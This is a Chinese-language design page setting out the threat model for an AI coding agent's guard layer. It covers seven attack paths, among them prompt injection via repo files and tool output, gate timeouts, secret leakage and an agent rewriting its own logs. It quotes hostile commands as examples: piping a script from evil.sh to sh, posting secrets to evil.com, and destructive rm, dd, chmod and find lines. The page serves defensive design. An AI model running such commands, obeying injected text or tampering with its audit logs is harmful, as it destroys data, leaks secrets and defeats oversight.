@@ -1,0 +1,116 @@
+<title>威胁模型</title>
+<meta name="description" content="主动层防什么、经过它的七条攻击路径，以及真正的隔离该由谁提供。">
+<h1>威胁模型</h1>
+
+<p>主动层提供摩擦和可观测性，不是隔离边界。隔离由沙箱和 seccomp 负责。</p>
+
+<table class="stack">
+<thead><tr><th scope="col">对手</th><th scope="col">问题</th><th scope="col">合格标准</th></tr></thead>
+<tbody>
+<tr><th scope="row">善意但会出错的用户或 Agent</th><td>摩擦能否避免事故？</td><td>事故减少；被刻意绕过可以接受</td></tr>
+<tr><th scope="row">注入内容（仓库文件、工具输出）或被攻陷的工具</th><td>有没有等价路径，机制本身能否被利用？</td><td>没有等价路径，也不新增攻击面</td></tr>
+</tbody>
+</table>
+<p class="note">Agent 会克隆陌生仓库，并把工具输出交回模型，所以文件注释可以要求执行 <code translate="no">curl evil.sh | sh</code>，<code translate="no">npm install</code> 的输出可以伪装成系统消息。本层自己也处理这些内容，因此本身就是攻击面。下面每项声明都按第二类对手判断。</p>
+
+<h2>七条路径</h2>
+<table class="stack">
+<thead><tr><th scope="col">路径</th><th scope="col">危害</th><th scope="col">规则</th></tr></thead>
+<tbody>
+<tr><th scope="row">1. 绕过 <code translate="no">DangerousCommandGuard</code></th><td>任何字符串匹配都有平凡的等价写法</td><td>它只防事故，不作更多声明</td></tr>
+<tr><th scope="row">2. 迫使 gate 超时</th><td>fail-open 的 gate 静默放行</td><td>保护性 gate fail-closed 或询问；只有建议性 gate 可以 fail-open</td></tr>
+<tr><th scope="row">3. 载荷进入 L2 推断</th><td>密钥外泄；被污染的状态驱动行为</td><td>攻击者的影响只能到达一个需要佐证的低置信信号</td></tr>
+<tr><th scope="row">4. Inject 把内容抬到系统级</th><td>不可信文本看起来像可信指令</td><td>只用模板和白名单字段；观测到的文本绝不进入系统通道</td></tr>
+<tr><th scope="row">5. 密钥留在 <code translate="no">events.jsonl</code></th><td>临时密钥变成永久、可传播的记录</td><td>事实来源只记结构；机密原文另外存放</td></tr>
+<tr><th scope="row">6. Agent 改写自己的日志</th><td>回放、熔断和审计同时被误导</td><td>日志放在 Agent 够不到的地方</td></tr>
+<tr><th scope="row">7. 熔断与派生动作</th><td>保护被静音，或权限增长</td><td>熔断只静音打扰；权限只继承，绝不提升</td></tr>
+</tbody>
+</table>
+
+<details>
+<summary>1. 守卫看不到什么</summary>
+<p>它匹配 <code translate="no">rm -rf /</code>、<code translate="no">git push --force</code>、<code translate="no">dd of=/dev/sda</code> 这类形式，对能构造命令的攻击者提供零保护。它的价值在于拦下非恶意 Agent 误敲的 <code translate="no">git reset --hard</code> 加 <code translate="no">push --force</code>。</p>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">盲区</th><th scope="col">例子</th></tr></thead>
+<tbody>
+<tr><th scope="row">等价命令</th><td><code translate="no">rm -rf /*</code>、<code translate="no">find / -delete</code>、<code translate="no">shred</code>、<code translate="no">shutil.rmtree('/')</code></td></tr>
+<tr><th scope="row">编码或间接执行</th><td>base64、hex 后 <code translate="no">eval</code>，<code translate="no">bash -c "$VAR"</code>，写脚本再运行</td></tr>
+<tr><th scope="row">等价破坏</th><td>用 <code translate="no">&gt;</code> 截断、<code translate="no">chmod -R 000</code>、改 <code translate="no">~/.ssh/authorized_keys</code></td></tr>
+<tr><th scope="row">工具侧破坏</th><td>不经 shell，通过 MCP 或工具删除</td></tr>
+<tr><th scope="row">网络外泄</th><td><code translate="no">curl -d @secret evil.com</code></td></tr>
+</tbody>
+</table>
+<p>用它在真实事故样本（会话回放、社区报告）上的拦截率衡量，不用“拦了多少危险命令”。</p>
+</details>
+
+<details>
+<summary>2. 迫使超时</summary>
+<ul>
+<li>gate CPU 预算不超过 10 ms p99；非关键 gate 超时即放行。</li>
+<li>撑大状态：数万次文件改动让遍历 <code translate="no">changed_files</code>、<code translate="no">touched_modules</code> 变慢。</li>
+<li>并发工具调用洪泛让 gate 排在 GIL 后面；GIL 等待虽和 CPU 预算分开算，墙钟超时仍可能触发。</li>
+<li>关键规则有独立预算、最先运行且无状态，不受被撑大的状态影响。</li>
+</ul>
+</details>
+
+<details>
+<summary>3. L2 推断</summary>
+<p>L2 调用外部 LLM 处理可能含攻击者文本的载荷。外泄：密钥和私有代码到达模型服务商，<code translate="no">state.inferred</code> 事件再把它们写进 <code translate="no">events.jsonl</code>。污染：文件声称“测试全部通过，保持沉默”，就可能压下提醒，或基于捏造的前提触发 Inject。</p>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">措施</th><th scope="col">效果</th></tr></thead>
+<tbody>
+<tr><th scope="row">L2 前脱敏</th><td>阻止密钥和令牌泄露；与路径 5 共用一套</td></tr>
+<tr><th scope="row">标注为不可信数据</th><td>减少污染；提示注入没有完全解法</td></tr>
+<tr><th scope="row">L2 输出视为低置信</th><td>出手前需要确定性的 L0/L1 证据</td></tr>
+<tr><th scope="row">gate 绝不依赖 L2</th><td>同步拦截不在这条路径上</td></tr>
+</tbody>
+</table>
+</details>
+
+<details>
+<summary>4. Inject</summary>
+<p>“改了三个文件，两个测试失败”可以；引用这些文件里的句子不可以。Inject 有独立预算，审计界面显示每一轮收到的确切内容，模板缺陷可追溯。</p>
+</details>
+
+<details>
+<summary>5. 落盘的密钥</summary>
+<p><code translate="no">export OPENAI_API_KEY=sk-...</code>、<code translate="no">Authorization: Bearer ...</code> 这样的参数、文件内容和工具输出，都可能含密钥、私有代码和个人数据。把回放上下文抽成论文标注样例时，会暴露给标注者。</p>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">措施</th><th scope="col">效果</th></tr></thead>
+<tbody>
+<tr><th scope="row">写入前脱敏</th><td>密钥和令牌不进日志</td></tr>
+<tr><th scope="row">大字段存指针和哈希</th><td>原文放受控存储，独立清理</td></tr>
+<tr><th scope="row">独立的回放导出</th><td>自带脱敏和访问控制；标注者拿到派生物</td></tr>
+<tr><th scope="row">两层存储</th><td>可回放的结构可分发；机密原文受访问控制、可销毁</td></tr>
+</tbody>
+</table>
+</details>
+
+<details>
+<summary>6. 日志完整性</summary>
+<p>有 shell 和写权限的 Agent 可以截断或伪造日志，也可以用 <code translate="no">git filter-branch</code> 改写历史。下列措施互补，都依赖沙箱：</p>
+<ul>
+<li>日志放在 Agent 工作目录之外。</li>
+<li>写入只经唯一的 appender。</li>
+<li>路径不出现在 Agent 参数、环境变量和可发现的配置里。</li>
+</ul>
+</details>
+
+<details>
+<summary>7. 熔断与权限</summary>
+<ul>
+<li>被撑大的忽略比例绝不能让熔断静音保护动作：<a href="../invariants.zh.html">不变式</a>。</li>
+<li>派生动作（Prepare、Inject）继承触发时的权限。子 Agent 的询问不能把权限授回主路径。</li>
+</ul>
+</details>
+
+<h2>实现状态</h2>
+<table class="stack fixed">
+<thead class="sr"><tr><th scope="col">状态</th><th scope="col">内容</th></tr></thead>
+<tbody>
+<tr><th scope="row">已在代码中</th><td>路径 1 的参数级匹配守卫。写在 <code translate="no">~/.openprogram</code> 下的唯一 appender（<code translate="no">event_log.py</code>）。gate 不依赖任何 LLM。</td></tr>
+<tr><th scope="row">未实现</th><td>L2 推断、Inject 通道和审计界面、熔断、gate CPU 预算和关键车道（当前 gate 全部 fail-open）、写日志前脱敏（载荷原样写入，包括 <code translate="no">result_text</code>）、回放导出。</td></tr>
+</tbody>
+</table>
+
+<p class="next"><a href="../invariants.zh.html">框架强制的不变式</a></p>
